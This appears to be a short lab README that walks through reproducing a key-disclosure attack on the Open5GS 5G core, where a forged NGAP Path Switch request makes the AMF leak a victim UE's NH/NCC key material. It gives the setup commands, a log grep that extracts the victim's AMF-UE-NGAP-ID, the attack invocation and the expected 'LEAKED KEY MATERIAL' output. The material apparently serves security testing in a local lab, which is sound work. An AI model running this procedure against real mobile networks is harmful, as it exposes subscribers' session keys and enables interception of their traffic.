# Open5GS — Path Switch → {NH,NCC} key disclosure (T01)

Git Bash, from `ngap_tester/`. Terminals / live logs / how to verify: see [`../README.md`](../README.md).

**1. Core + RAN**
```bash
( cd ../5g-lab && ./scripts/core.sh up open5gs && ./scripts/ran.sh up ueransim open5gs )
# flaky registration (WSL2 clock jump)? ../5g-lab/scripts/fix-clock.sh
```
**2. Victim AMF-UE-NGAP-ID**
```bash
V=$(docker logs o5gs-amf 2>&1 | grep 'ngap-handler.c:815' | grep -oE 'AMF_UE_NGAP_ID\[[0-9]+\]' | tail -1 | grep -oE '[0-9]+'); echo $V
```
**3. Capture + fire**
```bash
CFG_CORE=open5gs ./capture_attack.sh open5gs_T01_path_switch_key_disclosure \
    o5gs-amf o5gs-smf ueransim-open5gs-ueransim-gnb-1 net-5glab 30 \
    -- path-switch --source-amf-ue-id $V --teid 0x11111111
```
**Expect:** NGAP **21 + 25** in `amf_ngap_nas_sbi.pcap`; `attack.jsonl` shows `LEAKED KEY
MATERIAL NCC/NH`; `smf_sbi_pfcp.pcap` has the AMF→SMF→UPF path-switch (SBI + PFCP).
**Restore:** `docker restart ueransim-open5gs-ueransim-ue-1`
